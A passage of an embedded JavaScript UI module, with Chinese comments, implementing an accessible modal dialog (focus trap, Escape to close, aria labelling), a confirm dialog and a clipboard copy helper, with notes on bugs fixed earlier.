前缀，逐个自增，不许两个同时打开的弹窗撞号。 */\nlet modalSeq = 0;\n\n/**\n * 一棵子树里\"可以拿到键盘焦点\"的元素，按 DOM 顺序。焦点陷阱与初始焦点都靠它。\n *\n * ⚠️⚠️ **第一版写的是 `root.walk()`，那是测试夹具（`tests/helpers/fake-dom.ts`）\n * 自己发明的方法，真实 `HTMLElement` 上根本没有这个方法**——DOM 垫片里的\n * `FakeElement` 恰好也实现了 `.walk()`，于是全部 DOM 测试与本文件自己的\n * `querySelectorAll` 写法看着都对，`pnpm test` 全绿，**但在真实浏览器里一按 Tab\n * 就在控制台抛 `TypeError: root.walk is not a function`**，焦点陷阱整个不生效\n * ——这正是 `tests/helpers/fake-dom.ts` 文件头点名的边界②\"它不覆盖真实浏览器的\n * 一切\"，人工冒烟（Playwright 打真实浏览器）当场抓到。现在改成只用 `.children` +\n * `.tagName` 手写递归——这两个是 DOM 标准属性，真实元素与 `FakeElement` 都有；\n * `tagName` 真实浏览器上恒为大写（`\"BUTTON\"`），这里统一转小写再比较。\n */\nfunction focusableIn(root) {\n  const FOCUSABLE_TAGS = new Set([\"button\", \"input\", \"textarea\", \"select\", \"a\"]);\n  const out = [];\n  const visit = (node) => {\n    const tag = String(node.tagName || \"\").toLowerCase();\n    if (FOCUSABLE_TAGS.has(tag) && !node.disabled) out.push(node);\n    for (const child of node.children) visit(child);\n  };\n  visit(root);\n  return out;\n}\n\n/**\n * 通用弹窗。**它现在守着删除 / 批量操作这类破坏性动作**，焦点管理不是可选项\n * ——评审指出第一版完全没有：无初始焦点、无焦点陷阱、无 Escape、`<h2>` 没有\n * `aria-labelledby`，键盘 / 读屏用户可以在「确认删除 20 把」弹窗还开着的时候\n * Tab 出去操作背后被弹窗盖住的表格。现在四条都补上：\n *   ① 打开时焦点落在弹窗容器本身（`tabindex=\"-1\"` + `.focus()`）——不猜\"第一个\n *      输入框\"，因为确认类弹窗里可能只有两颗按钮；\n *   ② Tab / Shift+Tab 只在弹窗内部的可聚焦元素之间循环；\n *   ③ Escape 直接关闭（等同取消，不跑任何 `onClick`）；\n *   ④ `<h2>` 与 `role=\"dialog\"` 的容器之间用 `aria-labelledby` 关联。\n *\n * **`actions[i].keepOpen: true`**：点击后不自动关闭，`onClick` 拿到 `close`\n * 自己决定什么时候关（P3c Task 4 追加裁定修的一个真缺陷——`onClick` 原来无条件\n * 先 `back.remove()` 再跑，导入弹窗校验失败/网络失败时弹窗已经关了，粘进去的\n * 200 行只剩一句 toast，其余全丢）。不设 `keepOpen` 时行为与此前完全一致：\n * 点击后立即关闭，除非 `onClick` **同步**返回 `false`。\n */\nexport function openModal(titleKey, bodyNode, actions) {\n  const back = el(\"div\", { class: \"modal-back\" });\n  const box = el(\"div\", { class: \"modal\", role: \"dialog\", \"aria-modal\": \"true\", tabindex: \"-1\" });\n  const titleId = `modal-title-${++modalSeq}`;\n  box.setAttribute(\"aria-labelledby\", titleId);\n  box.appendChild(elI18n(\"h2\", titleKey, { id: titleId }));\n  box.appendChild(bodyNode);\n  const bar = el(\"div\", { class: \"modal-actions\" });\n  const close = () => back.remove();\n  for (const a of actions) {\n    const b = elI18n(\"button\", a.labelKey, { class: a.danger ? \"danger\" : \"\" });\n    b.addEventListener(\"click\", () => {\n      const result = a.onClick && a.onClick(close);\n      if (!a.keepOpen && result !== false) close();\n    });\n    bar.appendChild(b);\n  }\n  box.appendChild(bar);\n\n  box.addEventListener(\"keydown\", (ev) => {\n    if (ev.key === \"Escape\") { close(); return; }\n    if (ev.key !== \"Tab\") return;\n    const items = focusableIn(box);\n    if (items.length === 0) return;\n    const first = items[0];\n    const last = items[items.length - 1];\n    const current = document.activeElement;\n    if (ev.shiftKey) {\n      if (current === first || !items.includes(current)) { ev.preventDefault(); last.focus(); }\n    } else if (current === last || !items.includes(current)) {\n      ev.preventDefault();\n      first.focus();\n    }\n  });\n\n  back.appendChild(box);\n  document.body.appendChild(back);\n  box.focus();\n  return close;\n}\n\nexport function confirmModal(titleKey, messageKey, onConfirm) {\n  return openModal(titleKey, elI18n(\"p\", messageKey), [\n    { labelKey: \"common.cancel\" },\n    { labelKey: \"common.confirm\", danger: true, onClick: onConfirm },\n  ]);\n}\n\nexport async function copy(text) {\n  try {\n    await navigator.clipboard.writeText(text);\n    toast(t(\"common.copied\"), \"ok\");\n  } catch (e) {\n    // 剪贴板在非 TLS 下不可用是常态，**不要**假装成功。\n    toast(t(\"common.copyFailed\"), \"warn\");\n  }\n}\n", type: "text/javascript; charset=utf-8", etag: "\"906dbdbd1f7449f0\"" },
};

